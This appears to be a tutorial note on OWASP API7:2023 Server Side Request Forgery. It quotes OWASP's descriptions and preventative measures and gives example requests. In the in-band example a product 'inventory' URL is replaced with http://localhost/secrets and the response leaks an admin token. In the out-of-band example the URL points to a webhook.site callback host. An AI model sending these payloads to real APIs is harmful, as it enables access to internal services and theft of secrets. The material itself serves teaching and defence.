API7:2023 Server Side Request Forgery is a vulnerability that takes place when a user is able to control the remote resources retrieved by an application.  An attacker can use an API to supply their own input, in the form of a URL, to control the remote resources that are retrieved by the targeted server.

## [OWASP Attack Vector Description](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)

_Exploitation requires the attacker to find an API endpoint that accesses a URI that’s provided by the client. In general, basic SSRF (when the response is returned to the attacker), is easier to exploit than Blind SSRF in which the attacker has no feedback on whether or not the attack was successful._

## [OWASP Security Weakness Description](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)

_Modern concepts in application development encourage developers to access URIs provided by the client. Lack of or improper validation of such URIs are common issues. Regular API requests and response analysis will be required to detect the issue. When the response is not returned (Blind SSRF) detecting the vulnerability requires more effort and creativity._

## [OWASP Impacts Description](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)

_Successful exploitation might lead to internal services enumeration (e.g. port scanning), information disclosure, bypassing firewalls, or other security mechanisms. In some cases, it can lead to DoS or the server being used as a proxy to hide malicious activities._

## In-Band SSRF Example

**Intercepted Request:**

`_POST api/v1/store/products_`

`_headers…_`

`_{_`

`_"inventory":"http://store.com/api/v3/inventory/item/12345"_`

`_}_`

**Attack:**

`_POST api/v1/store/products_`

`_headers…_`

`_{_`

`_"inventory":"_**_§_****_http://localhost/secrets_****_§"_**`

 }

**Response:**

HTTP/1.1 200 OK  
headers...  
**{**

**"secret_token":"SecretAdminToken123"**

**}**

# Out-of-Band SSRF Example

**Intercepted Request:**

`_POST api/v1/store/products_`

`_headers…_`

`_{_`

`_"inventory":"http://store.com/api/v3/inventory/item/12345"_`

 }

**Attack**:

`_POST api/v1/store/products_`

`_headers…_`

`_{_`

`_"inventory:"_**_§_****_http://localhost/secrets_****_§"_**`

} 

**Response:**

HTTP/1.1 200 OK  
headers...  
{}

![](attachments/Pasted%20image%2020250713202645.png)

**Attack**:

`_POST api/v1/store/products_`

`_headers…_`

`_{_`

`_"inventory":"_**_§[https://webhook.site/306b30f8-2c9e-4e5d-934d-48426d03f5c0](https://webhook.site/306b30f8-2c9e-4e5d-934d-48426d03f5c0)_****_§"_**`

 }

![](attachments/Pasted%20image%2020250713202658.png)

## [OWASP Preventative Measures](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)

- _Isolate the resource fetching mechanism in your network: usually, these features are aimed to retrieve remote resources and not internal ones._
- _Whenever possible, use allow lists of_
    - _Remote origins users are expected to download resources from (e.g. Google Drive, Gravatar, etc.)_
    - _URL schemes and ports_
    - _Accepted media types for a given functionality_
- _Disable HTTP redirections._
- _Use a well-tested and maintained URL parser to avoid issues caused by URL parsing inconsistencies._
- _Validate and sanitize all client-supplied input data._
- _Do not send raw responses to clients._

